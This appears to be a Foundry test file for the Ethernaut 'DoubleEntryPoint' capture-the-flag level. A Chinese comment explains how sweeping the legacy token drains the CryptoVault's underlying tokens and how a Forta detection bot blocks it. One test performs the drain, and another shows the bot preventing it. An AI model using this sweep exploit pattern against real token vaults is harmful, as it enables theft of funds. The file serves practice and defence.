// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Forta, IForta, CryptoVault, LegacyToken, DoubleEntryPoint, DetectionBot} from "../src/DoubleEntryPoint.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract DoubleEntryPointTest is Test {
    /*
    player: 0xaCab087f7f0977c31d68E8BAe117069a90Dc6574
    CryptoVault: 0x2D1039E4C4bd218bb02FbCf4cDB9d3AB7184B562
    LegacyToken: 0x2e22CAA6d55FBB5B5E3c61dC58d605106e46144E
    DoubleEntryPoint: 0xcB4e020647Bfe57Eea54a9ba715cE2Ff7f655E3c
    Forta: 0xc373EA0DEa8Eec74b535cDAf5F42c2d0aA574f97


    DoubleEntryPoint的delegatedFrom是LegacyToken
    LegacyToken的delegate是DoubleEntryPoint，
    CryptoVault的sweptTokensRecipient是player
    CryptoVault的underlying是DoubleEntryPoint

    漏洞:
    1. player调用CryptoVault.sweepToken(LegacyToken)
    2. CryptoVault调用LegacyToken.transfer(player, balance)
    3. DoubleEntryPoint.delegate.delegateTransfer(player, balance, CryptoVault) -> DoubleEntryPoint.delegateTransfer
    4. DoubleEntryPoint _transfer(CryptoVault, player, balance)

    如何阻止:
    DoubleEntryPoint的delegateTransfer有修饰器fortaNotify，只需要在Forta注册一个bot，这个bot raiseAlert即可
    */

    CryptoVault private cryptoVault = CryptoVault(0x2D1039E4C4bd218bb02FbCf4cDB9d3AB7184B562);
    LegacyToken private legacyToken = LegacyToken(0x2e22CAA6d55FBB5B5E3c61dC58d605106e46144E);
    DoubleEntryPoint private doubleEntryPoint = DoubleEntryPoint(0xcB4e020647Bfe57Eea54a9ba715cE2Ff7f655E3c);
    Forta private forta = Forta(0xc373EA0DEa8Eec74b535cDAf5F42c2d0aA574f97);
    address private player = address(0xaCab087f7f0977c31d68E8BAe117069a90Dc6574);

    function testCryptoVault() public {
        vm.startPrank(player, player);

        console.log(doubleEntryPoint.balanceOf(address(cryptoVault)));

        cryptoVault.sweepToken(IERC20(address(legacyToken)));

        console.log(doubleEntryPoint.balanceOf(address(cryptoVault)));
        assert(doubleEntryPoint.balanceOf(address(cryptoVault)) == 0);

        vm.stopPrank();
    }

    function testDoubleEntryPoint() public {
        DetectionBot detectionBot = new DetectionBot(IForta(address(forta)));

        vm.startPrank(player, player);

        forta.setDetectionBot(address(detectionBot));

        try cryptoVault.sweepToken(IERC20(address(legacyToken))) {
        } catch {}

        console.log(doubleEntryPoint.balanceOf(address(cryptoVault)));
        assert(doubleEntryPoint.balanceOf(address(cryptoVault)) != 0);

        vm.stopPrank();
    }
}